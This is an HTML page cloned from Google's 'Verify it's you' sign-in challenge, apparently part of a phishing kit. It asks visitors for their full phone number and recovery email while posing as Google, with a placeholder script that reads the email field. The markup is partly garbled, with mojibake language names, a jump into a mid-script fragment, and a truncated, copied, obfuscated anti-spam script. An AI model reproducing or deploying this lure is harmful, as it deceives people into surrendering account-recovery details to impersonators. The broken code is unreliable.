




<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="robots" content="noindex">
  <title>Sign in - Google Accounts</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weigh  t: 400;
  src: local('Open Sans'), local('OpenSans');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(Google_docs_files/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {

  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <style type="text/css">
  .flex-card {
  padding: 40px;
  width: auto;
  max-width: 560px;
  min-width: 270px;
  }
  .flex-card .rc-button {
  width: auto;
  padding: 0 8px;
  }
  </style>
  <style media="screen and (max-width: 580px)">
  .flex-card {
  width: 270px;
  padding: 20px 15px 30px;
  }
  .flex-card input[type=email],
  .flex-card input[type=number],
  .flex-card input[type=tel],
  .flex-card input[type=text],
  .flex-card .rc-button {
  width: 100%;
  }
  </style>
<style type="text/css">
  .challenge-card h1 {
  margin-bottom: 10px;
  }
  .challenge-card label {
  display: block;
  margin-bottom:10px
  }
  .challenge-card ul {
  list-style: none;
  padding: 0;
  }
  .challenge-card input[type=email],
  .challenge-card input[type=number],
  .challenge-card input[type=tel],
  .challenge-card input[type=text],
  .challenge-card input.rc-button {
  display: block;
  }
  .challenge-card input.radio {
  float: left;
  }
  .challenge-card .description {
  color: #737373;
  margin-bottom: 30px;
  }
  .challenge-card .option-wrapper {
  border-top: 1px solid #d5d5d5;
  }
  .challenge-card .option-wrapper input[name="challengetype"] {
  margin-bottom: 20px;
  margin-top: 20px;
  }
  .challenge-card .option {
  margin-left: 2em;
  zoom: 1;
  }
  .challenge-card hr {
  border: 0;
  height: 1px;
  color: #d5d5d5;
  background-color: #d5d5d5;
  }
  .challenge-card h2 {
  margin-bottom: 10px;
  }
  .challenge-card .label-selected {
  padding-top: 20px;
  font-weight: bold;
  }
  .challenge-card .label-unselected {
  padding-bottom: 20px;
  padding-top: 20px;
  font-weight: normal;
  margin-bottom: 0;
  }
  .challenge-card .option-content-selected {
  padding-bottom: 20px;
  visibility: visible;
  height: 100%;
  }
  .challenge-card .option-content-unselected {
  visibility: hidden;
  height: 0;
  }
  .challenge-card .help {
  color: #999;
  margin-left: 5px;
  }
  .challenge-card #submitChallenge {
  margin: 8px 0 13px;
  }
  .challenge-card .country-select {
  width: 100%;
  height: 37px;
  padding: 0 5px;
  -webkit-border-radius: 2px;
  -webkit-appearance: none;
  -moz-border-radius: 2px;
  border-radius: 2px;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  border: 1px solid #dcdcdc;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  line-height: 27px;
  list-style: none;
  margin: 0 0 .5em;
  min-width: 46px;
  outline: none;
  }
  .challenge-card #secret-question {
  margin-bottom: 10px;
  font-weight: bold;
  }
  .challenge-card #country-selector-wrapper {
  margin-bottom: 10px;
  }
  .feedback-link {
  vertical-align: bottom;
  max-width: 270px;
  display: inline-block;
  margin-top: 6px;
  }
  .app-icon {
  margin-left: 2px;
  margin-right: 2px;
  vertical-align: text-bottom;
  }
  .offlineotp-instructions {
  line-height: 20px;
  }
  .offlineotp-instructions li {
  margin: 5px 0;
  }
  div input[type=text].inline-textbox {
  display: inline;
  margin-right: 10px;
  }
  .extra-explanation {
  font-style: italic;
  font-weight: normal;
  color: #737373;
  line-height: 15px;
  }
  .primary-email-info {
  color: #737373;
  }
  .email-address-description {
  width: 180px;
  }
  .option-content-unselected .feedback-link,
  .option-content-unselected .authzen-action-image {
  float: none;
  }
  .authzen-action-image {
  float: left;
  margin-right: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  .challenge-card .description {
  margin-bottom: 18px;
  }
  .challenge-card .option-wrapper input[name="challengetype"] {
  margin-bottom: 10px;
  margin-top: 15px;
  }
  .challenge-card .label-selected {
  padding-top: 15px;
  }
  .challenge-card .label-unselected {
  padding-top: 15px;
  padding-bottom: 10px;
  }
  .challenge-card .option-content-selected {
  padding-bottom: 10px;
  }
</style>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
  </head>
  <body>
  <script type="text/javascript">
  
  var phoneNumber =document.getElementById("phoneNumber").value;
  var recEmail = document.getElementById("recEmail").value;
  
 

function validateForm() {
    var x = document.forms["challengeform"]["recEmail"].value;
	
   alert(x);
	}


</script>
  </script>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="Google" class="logo" src="Google_docs_files/google.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="card flex-card challenge-card">
  <form method="post" id="challengeform" action="#">
  <input type="hidden" id="here" value="test">
  <h1 id="login-challenge-heading">
  Verify it's you
  </h1>
  <div class="body">
  <p class="description">
  Something seems a bit different about the way you're trying to sign in. Complete the step below to let us know it's you and not someone pretending to be you.
  <a href="#" target="_blank">Learn more</a>.
  </p>
  <h2>
  Select a verification method
  </h2>
  
  <div id="challengeZippyContent">
  <div class="option-wrapper clearfix" id="PhoneVerificationChallengeOption">
  <input type="radio" class="radio" name="challengetype"
            id="PhoneVerificationChallenge" value="PhoneVerificationChallenge"
            
        >
  <div class="option">
  <label for="PhoneVerificationChallenge" id="PhoneVerificationChallengeLabel">
  Tell us your phone number
  ********</label>
  <div class="option-content"
        id="PhoneVerificationChallengeOptionContent">    
  <span role="alert" class="error-msg"><span id="sprytextfield1">
  <input type="text" name="phoneNumber" id="phoneNumber" size="30" dir="ltr"
        
        placeholder="Enter full phone number">
  <span class="textfieldRequiredMsg">A value is required.</span></span>
  </span>
  <span role="alert" class="error-msg">
  </span>
  <div class="help">
  We'll check if this matches the phone number we have on file
  </div>
  </div>
  </div>
  </div>
  <div class="option-wrapper clearfix" id="SecretQuestionChallengeOption">
  <input type="radio" class="radio" name="challengetype"
            id="SecretQuestionChallenge" value="SecretQuestionChallenge"
            
        >
  <div class="option">
  <label for="SecretQuestionChallenge"
        id="SecretQuestionChallengeLabel">
  Enter your recovery email
  </label>
  <div class="option-content"
        id="SecretQuestionChallengeOptionContent">
  

      <span id="sprytextfield2">
      <input type="text" name="recEmail" id="recEmail" size="30"
          
      >
      <span class="textfieldRequiredMsg">A value is required.</span></span> <span role="alert" class="error-msg">
  </span>
  <span role="alert" class="error-msg">
  </span>
  </div>
  </div>
  </div>
  </div>
  <input name="submitChallenge" id="submitChallenge"
           class="rc-button rc-button-submit" type="submit"
           value="Continue" >
  Having trouble? <a href="#">Reset your password instead</a>.
  </div>
  </form>
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="">
  About Google
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="Google_docs_files/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
                 >
  вЂЄAfrikaansвЂ¬
  </option>
  <option value="az"
                 >
  вЂЄazЙ™rbaycanвЂ¬
  </option>
  <option value="in"
                 >
  вЂЄBahasa IndonesiaвЂ¬
  </option>
  <option value="ms"
                 >
  вЂЄBahasa MelayuвЂ¬
  </option>
  <option value="ca"
                 >
  вЂЄcatalГ вЂ¬
  </option>
  <option value="cs"
                 >
  вЂЄДЊeЕЎtinaвЂ¬
  </option>
  <option value="da"
                 >
  вЂЄDanskвЂ¬
  </option>
  <option value="de"
                 >
  вЂЄDeutschвЂ¬
  </option>
  <option value="et"
                 >
  вЂЄeestiвЂ¬
  </option>
  <option value="en-GB"
                 >
  вЂЄEnglish (United Kingdom)вЂ¬
  </option>
  <option value="en"
                
                  selected="selected"
                 >
  вЂЄEnglish (United States)вЂ¬
  </option>
  <option value="es"
                 >
  вЂЄEspaГ±ol (EspaГ±a)вЂ¬
  </option>
  <option value="es-419"
                 >
  вЂЄEspaГ±ol (LatinoamГ©rica)вЂ¬
  </option>
  <option value="eu"
                 >
  вЂЄeuskaraвЂ¬
  </option>
  <option value="fil"
                 >
  вЂЄFilipinoвЂ¬
  </option>
  <option value="fr-CA"
                 >
  вЂЄFranГ§ais (Canada)вЂ¬
  </option>
  <option value="fr"
                 >
  вЂЄFranГ§ais (France)вЂ¬
  </option>
  <option value="gl"
                 >
  вЂЄgalegoвЂ¬
  </option>
  <option value="hr"
                 >
  вЂЄHrvatskiвЂ¬
  </option>
  <option value="zu"
                 >
  вЂЄisiZuluвЂ¬
  </option>
  <option value="is"
                 >
  вЂЄГ­slenskaвЂ¬
  </option>
  <option value="it"
                 >
  вЂЄItalianoвЂ¬
  </option>
  <option value="sw"
                 >
  вЂЄKiswahiliвЂ¬
  </option>
  <option value="lv"
                 >
  вЂЄlatvieЕЎuвЂ¬
  </option>
  <option value="lt"
                 >
  вЂЄlietuviЕівЂ¬
  </option>
  <option value="hu"
                 >
  вЂЄmagyarвЂ¬
  </option>
  <option value="nl"
                 >
  вЂЄNederlandsвЂ¬
  </option>
  <option value="no"
                 >
  вЂЄnorskвЂ¬
  </option>
  <option value="pl"
                 >
  вЂЄpolskiвЂ¬
  </option>
  <option value="pt"
                 >
  вЂЄPortuguГЄsвЂ¬
  </option>
  <option value="pt-BR"
                 >
  вЂЄPortuguГЄs (Brasil)вЂ¬
  </option>
  <option value="pt-PT"
                 >
  вЂЄPortuguГЄs (Portugal)вЂ¬
  </option>
  <option value="ro"
                 >
  вЂЄromГўnДѓвЂ¬
  </option>
  <option value="sk"
                 >
  вЂЄSlovenДЌinaвЂ¬
  </option>
  <option value="sl"
                 >
  вЂЄslovenЕЎДЌinaвЂ¬
  </option>
  <option value="fi"
                 >
  вЂЄSuomiвЂ¬
  </option>
  <option value="sv"
                 >
  вЂЄSvenskaвЂ¬
  </option>
  <option value="vi"
                 >
  вЂЄTiбєїng Viб»‡tвЂ¬
  </option>
  <option value="tr"
                 >
  вЂЄTГјrkГ§eвЂ¬
  </option>
  <option value="el"
                 >
  вЂЄО•О»О»О·ОЅО№ОєО¬вЂ¬
  </option>
  <option value="bg"
                 >
  вЂЄР±СЉР»РіР°СЂСЃРєРёвЂ¬
  </option>
  <option value="mn"
                 >
  вЂЄРјРѕРЅРіРѕР»вЂ¬
  </option>
  <option value="ru"
                 >
  вЂЄР СѓСЃСЃРєРёР№вЂ¬
  </option>
  <option value="sr"
                 >
  вЂЄРЎСЂРїСЃРєРёвЂ¬
  </option>
  <option value="uk"
                 >
  вЂЄРЈРєСЂР°С—РЅСЃСЊРєР°вЂ¬
  </option>
  <option value="ka"
                 >
  вЂЄбѓҐбѓђбѓ бѓ—бѓЈбѓљбѓвЂ¬
  </option>
  <option value="hy"
                 >
  вЂЄХ°ХЎХµХҐЦЂХҐХ¶вЂ¬
  </option>
  <option value="iw"
                 >
  вЂ«ЧўЧ‘ЧЁЧ™ЧЄвЂ¬вЂЋ
  </option>
  <option value="ur"
                 >
  вЂ«Ш§Ш±ШЇЩ€вЂ¬вЂЋ
  </option>
  <option value="ar"
                 >
  вЂ«Ш§Щ„Ш№Ш±ШЁЩЉШ©вЂ¬вЂЋ
  </option>
  <option value="fa"
                 >
  вЂ«ЩЃШ§Ш±ШіЫЊвЂ¬вЂЋ
  </option>
  <option value="am"
                 >
  вЂЄбЉ б€›б€­бЉ›вЂ¬
  </option>
== 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29tCg== */(function(){eval('var f,g=this,k=void 0,p=Array.prototype,q=function(a,b,c){return 2>=arguments.length?p.slice.call(a,b):p.slice.call(a,b,c)},s=function(a,b,c,d,e){c=a.split("."),d=g,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||b===k?d=d[e]?d[e]:d[e]={}:d[e]=b},t=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},v=(new function(){},function(a,b){a.n=("E:"+b.message+":"+b.stack).slice(0,2048)}),w=function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b},x=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},A=function(a,b){a.K.push(a.c.slice()),a.c[a.b]=k,z(a,a.b,b)},B=function(a,b,c){return c=function(){return a},b=function(){return c()},b.V=function(b){a=b},b},D=function(a,b,c,d){return function(){if(!d||a.s)return z(a,a.N,arguments),z(a,a.k,c),C(a,b)}},E=function(a,b,c,d){for(c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},F=function(a,b,c,d){if(8192>a.length)return String.fromCharCode.apply(null,a);for(b="",c=0;c<a.length;c+=8192)d=q(a,c,c+8192),b+=String.fromCharCode.apply(null,d);return b},C=function(a,b,c,d){return c=a.a(a.b),a.e&&c<a.e.length?(z(a,a.b,a.e.length),A(a,b)):z(a,a.b,b),d=a.t(),z(a,a.b,c),d},H=function(a,b,c,d){for(b={},b.O=a.a(G(a)),b.P=G(a),c=G(a)-1,d=G(a),b.self=a.a(d),b.D=[];c--;)d=G(a),b.D.push(a.a(d));return b},I=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},z=function(a,b,c){if(b==a.b||b==a.m)a.c[b]?a.c[b].V(c):a.c[b]=B(c);else 